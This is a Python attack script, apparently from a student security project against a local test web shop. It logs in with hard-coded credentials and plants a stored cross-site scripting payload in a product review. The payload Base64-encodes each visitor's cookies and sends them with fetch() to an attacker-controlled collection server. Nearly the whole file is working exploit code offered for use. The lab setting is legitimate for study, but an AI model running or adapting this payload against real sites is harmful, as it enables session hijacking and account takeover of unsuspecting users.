import socket
import requests


def detect_lan_ip():
    # Open a UDP socket toward a public address. No packet is actually
    # sent (we never call sendto), but the OS picks the outbound
    # interface so getsockname() returns this machine's LAN IP.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()


ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()

# --- XSS Payload ---
# The code that steals the cookie and sends it to your C2 server
# btoa - a function that encodes a string to Base64 to hide the cookies
# fetch - a function that sends a request to the attacker server
PAYLOAD = f"""
The handle gets too hot, and there's a weird smell.<script>
    var encoded = btoa(document.cookie);
    fetch('http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + encoded);
</script>
"""

# The ID of the electric kettle in the DB is 81
def perform_stored_xss(username="HUCKER", password="hucker123", vulnerable_site_url="http://localhost/CyberProject/product_view.php?id=81"):
    # split() returns a list of the parts of the URL [0] is the base url
    base_url = vulnerable_site_url.split("/product_view.php")[0]
    login_url = f"{base_url}/login.php"

    session = requests.Session()

    print("[*] Step 1: Logging into the system...")
    login_data = {
        "username": username,
        "password": password,
        "login_submit": ""
    }
    
    response = session.post(login_url, data=login_data)
    if "home.php" in response.url or session.cookies.get("PHPSESSID"):
        print(f"[+] Login successful as {username}!")
    else:
        print("[! ] Login failed. Check your credentials.")
        return

    print(f"[*] Step 2: Injecting Stored XSS into product page...")
    
    review_data = {
        "rating": "2",
        "content": PAYLOAD,
        "submit_review": ""
    }

    # Sending the malicious review
    inject_response = session.post(vulnerable_site_url, data=review_data)

    if inject_response.status_code == 200:
        print("[SUCCESS] Payload injected successfully into the database!")
        print(f"[!] Now, any user visiting {vulnerable_site_url} will be compromised.")
        return True
    else:
        print("[!] Failed to inject payload.")
        return False

if __name__ == "__main__":
    perform_stored_xss()